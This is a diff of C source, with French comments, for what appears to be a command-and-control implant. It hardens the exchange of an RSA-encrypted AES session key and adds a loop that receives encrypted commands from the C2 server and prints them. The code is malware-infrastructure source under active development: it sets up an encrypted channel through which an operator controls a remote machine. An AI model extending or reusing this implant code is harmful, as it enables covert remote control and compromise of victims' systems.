@@ -54,36 +54,44 @@ static int send_keyx(fso_conn_t *conn, const fso_rsa_keypair_t *kp)
 static int recv_auth(fso_conn_t *conn, const fso_rsa_keypair_t *kp,
                      fso_session_t *sess)
 {
-    uint8_t buf[2048];
-    int n = fso_conn_recv(conn, buf, sizeof(buf));
-    if (n <= 0) {
-        fprintf(stderr, "[-] Réception MSG_AUTH échouée\n");
+    /* 1. Lire exactement l'en-tête. */
+    uint8_t hdr_buf[FSO_HEADER_SIZE];
+    if (fso_conn_recv_exact(conn, hdr_buf, FSO_HEADER_SIZE) != FSO_HEADER_SIZE) {
+        fprintf(stderr, "[-] Réception en-tête MSG_AUTH échouée\n");
         return -1;
     }
 
-    /* Unpack. */
     fso_header_t header;
-    const uint8_t *payload;
-    if (fso_unpack(buf, (size_t)n, &header, &payload) != 0) {
-        fprintf(stderr, "[-] fso_unpack échoué\n");
+    if (fso_unpack_header(hdr_buf, FSO_HEADER_SIZE, &header) != 0) {
+        fprintf(stderr, "[-] fso_unpack_header échoué\n");
         return -1;
     }
-
     if (header.type != MSG_AUTH) {
         fprintf(stderr, "[-] Type inattendu : 0x%02X\n", header.type);
+        return -1;
+    }
+    if (header.length > 2048) {
+        fprintf(stderr, "[-] MSG_AUTH trop grand\n");
+        return -1;
+    }
+
+    /* 2. Lire exactement le payload chiffré. */
+    uint8_t encrypted[2048];
+    if (fso_conn_recv_exact(conn, encrypted, header.length) != (int)header.length) {
+        fprintf(stderr, "[-] Réception payload MSG_AUTH échouée\n");
         return -1;
     }
 
     printf("[*] MSG_AUTH reçu (%u octets)\n", header.length);
 
-    /* Déchiffre la clé AES avec la clé privée RSA. */
+    /* 3. Déchiffrer la clé AES avec la clé privée RSA. */
     size_t aes_len = sizeof(sess->aes_key);
     if (fso_rsa_decrypt(kp->priv, kp->priv_len,
-                        payload, header.length,
+                        encrypted, header.length,
                         sess->aes_key, &aes_len) != FSO_CRYPTO_OK) {
         fprintf(stderr, "[-] Déchiffrement RSA échoué\n");
         return -1;
-    }
+                        }
 
     if (aes_len != FSO_KEY_SIZE) {
         fprintf(stderr, "[-] Taille clé AES invalide : %zu\n", aes_len);
@@ -156,22 +164,32 @@ int main(int argc, char **argv)
     /* Boucle infinie : en attente de commandes. */
     printf("[*] En attente de commandes du C2...\n");
 
-    char buf[FSO_CONN_RECV_BUF];
-    while (conn.connected) {
-        int n = fso_conn_recv(&conn, buf, sizeof(buf));
+    uint8_t *payload = malloc(FSO_MAX_PAYLOAD);
+    if (!payload) {
+        fprintf(stderr, "[-] malloc échoué\n");
+        goto cleanup;
+    }
 
-        if (n == 0) {
-            printf("[-] C2 a fermé la connexion\n");
-            break;
-        }
+    while (conn.connected) {
+        fso_header_t header;
+
+        int n = fso_conn_recv_secure(&conn, sess.aes_key,
+                                      &header, payload, FSO_MAX_PAYLOAD);
         if (n < 0) {
             printf("[-] Erreur de réception\n");
             break;
         }
 
-        printf("[*] %d octets reçus du C2\n", n);
-        /* TODO: déchiffrer et traiter la commande. */
+        printf("[C2] type=0x%02X seq=%u, %d octets\n",
+               header.type, header.seq_id, n);
+
+        if (n > 0) {
+            fwrite(payload, 1, (size_t)n, stdout);
+            printf("\n");
+        }
     }
+
+    free(payload);
 
 cleanup:
     printf("[*] Déconnexion\n");
